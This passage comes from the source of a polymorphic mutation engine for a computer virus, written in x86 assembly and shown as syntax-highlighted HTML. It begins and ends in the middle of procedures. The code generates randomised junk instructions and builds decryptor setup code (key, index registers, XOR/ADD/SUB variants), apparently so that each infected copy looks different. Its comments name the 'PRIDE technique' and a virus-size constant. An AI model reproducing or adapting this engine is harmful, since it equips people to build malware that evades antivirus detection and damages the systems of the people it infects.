                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc0">
</span><span class="sc5">DoMOVRegMem</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoMOVMemReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">

     </span><span class="sc5">@@OtherRandom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@OtherRandom</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc0">

     </span><span class="sc5">@@PUSHPOP</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPUSHReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoPOPMem</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndRecursiveMOVing</span><span class="sc0">

   </span><span class="sc5">@@DirectMOV</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0589h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CommonMRMDirectMOV</span><span class="sc0">
   </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8089h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CommonMRMDirectMOV2</span><span class="sc0">

   </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@DirectMOV</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@DirectMOVIndexed</span><span class="sc0">
</span><span class="sc5">DoMOVMemReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This constructs a XOR between two registers. As the function DoXOR, it has</span><span class="sc0">
</span><span class="sc1">;; to be made directly, since there aren't more options to do a XOR. Anyway,</span><span class="sc0">
</span><span class="sc1">;; we can use two slightly different opcodes to perform that.</span><span class="sc0">
</span><span class="sc1">;; When we call it: DH=Source register, DL=Destiny register</span><span class="sc0">
</span><span class="sc5">DoXORRegReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">

     </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C031h</span><span class="sc0">  </span><span class="sc1">; Opcode of XOR Reg,Reg</span><span class="sc0">
  </span><span class="sc5">DoXXXRegReg</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Random Zero Flag</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">           </span><span class="sc1">; Jump and avoid the next instructions</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Convert opcode to 33h so...</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">;...we must exchange source and destiny</span><span class="sc0">
        </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">  </span><span class="sc1">; Set the registers to the opcode</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Store the opcode</span><span class="sc0">

     </span><span class="sc5">EndOfRecursiveMOVing</span><span class="sc4">:</span><span class="sc0">
     </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">S_EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DoXORRegReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoADDRegReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@NoRecursives</span><span class="sc0">

      </span><span class="sc5">@@Other</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Other</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADDRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndOfRecursiveMOVing</span><span class="sc0">

     </span><span class="sc5">@@LEA</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048Dh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA_x</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA_y</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@LEA_x</span><span class="sc0">
     </span><span class="sc5">@@LEA_y</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
     </span><span class="sc5">@@LEA_x</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndOfRecursiveMOVing</span><span class="sc0">

     </span><span class="sc5">@@NoRecursives</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LEA</span><span class="sc0">

     </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C001h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXRegReg</span><span class="sc0">
</span><span class="sc5">DoADDRegReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DoSUBRegReg</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MOVingRecursLevel</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">   </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAndReserveVar</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Direct</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOVMemReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoSUBRegMem</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReleaseVar</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EndOfRecursiveMOVing</span><span class="sc0">

     </span><span class="sc5">@@Direct</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C029h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoXXXRegReg</span><span class="sc0">
</span><span class="sc5">DoSUBRegReg</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This set of three functions are called using RandomCalling to call them</span><span class="sc0">
</span><span class="sc1">;; in a random order, because the order doesn't matter here. This functions</span><span class="sc0">
</span><span class="sc1">;; set the initial value to Index1, Index2 and Key registers.</span><span class="sc0">
</span><span class="sc5">SetIndex2Register</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InitialValue</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Get the initial value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get Index2Register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">            </span><span class="sc1">; Make a move operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SetIndex2Register</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Set the Index1 register initial value</span><span class="sc0">
</span><span class="sc5">SetIndex1Register</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get Index1Register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">            </span><span class="sc1">; Generate a random addition for the</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">  </span><span class="sc1">; PRIDE technique</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">             </span><span class="sc1">; Make a move operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">   </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SetIndex1Register</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Set the Key register value</span><span class="sc0">
</span><span class="sc5">SetKeyRegister</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get KeyRegister</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DecryptKey</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get decryption key</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">            </span><span class="sc1">; Make a move operation</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">KeyIsInit</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">          </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">SetKeyRegister</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">KeyIsInit</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;; Here it is the most used function of this engine. This function calls up to</span><span class="sc0">
</span><span class="sc1">;; three times to the function Garbage, which generates a single garbage ins-</span><span class="sc0">
</span><span class="sc1">;; truction (in the case it doesn't select any recursive type).</span><span class="sc0">
</span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc1">; Get a random number between 0 and 3</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Check0</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@End</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Loop</span><span class="sc0">
     </span><span class="sc5">@@Check0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@End</span><span class="sc0">
    </span><span class="sc5">@@Loop</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Garbage</span><span class="sc0">  </span><span class="sc1">; Call the main function of garbage</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@Loop</span><span class="sc0">   </span><span class="sc1">; Repeat EAX times</span><span class="sc0">
      </span><span class="sc5">@@End</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Restore EAX</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">            </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">GarbageRecursivity</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; This variable is incremented each time</span><span class="sc0">
                                  </span><span class="sc1">; we enter in Garbage, and decreased when</span><span class="sc0">
                                  </span><span class="sc1">; we exit. With this, we can control the</span><span class="sc0">
                                  </span><span class="sc1">; garbage quantity on recursive types, and</span><span class="sc0">
                                  </span><span class="sc1">; we can have a closer control when creating</span><span class="sc0">
                                  </span><span class="sc1">; subroutines.</span><span class="sc0">

</span><span class="sc1">;; The main garbage generator. It can generate garbage of many types, and it</span><span class="sc0">
</span><span class="sc1">;; can be recursively called (some types of garbage are composed of two or</span><span class="sc0">
</span><span class="sc1">;; more instructions, so DoRandomGarbage is called between).</span><span class="sc0">
</span><span class="sc5">Garbage</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">     </span><span class="sc1">; Save all</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase the num-</span><span class="sc0">
                                         </span><span class="sc1">; ber of active instances of Garbage</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GarbageRecursivity</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc1">; If we are too</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Return</span><span class="sc0">            </span><span class="sc1">; high on recursive instances, exit</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">   </span><span class="sc1">; Do we make garbage?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@Make1</span><span class="sc0">
                </span><span class="sc6">jp</span><span class="sc0">    </span><span class="sc5">@@DontMake</span><span class="sc0">

      </span><span class="sc5">@@Make1</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">    </span><span class="sc1">; Get a random type</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@GeneralWithValue</span><span class="sc0"> </span><span class="sc1">; Let's do a common type with direct</span><span class="sc0">
                                         </span><span class="sc1">; value</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@GeneralWithReg</span><span class="sc0">  </span><span class="sc1">; Common type with a random register</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NotEasyOnes</span><span class="sc0">     </span><span class="sc1">; Some complex ones</span><span class="sc0">
      </span><span class="sc1">;; Some mixed types. We can do XCHG, MOVZX, MOVSX, INC, DEC and PUSH/</span><span class="sc0">
      </span><span class="sc1">;; POP pairs</span><span class="sc0">
   </span><span class="sc5">@@SomeMore</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">
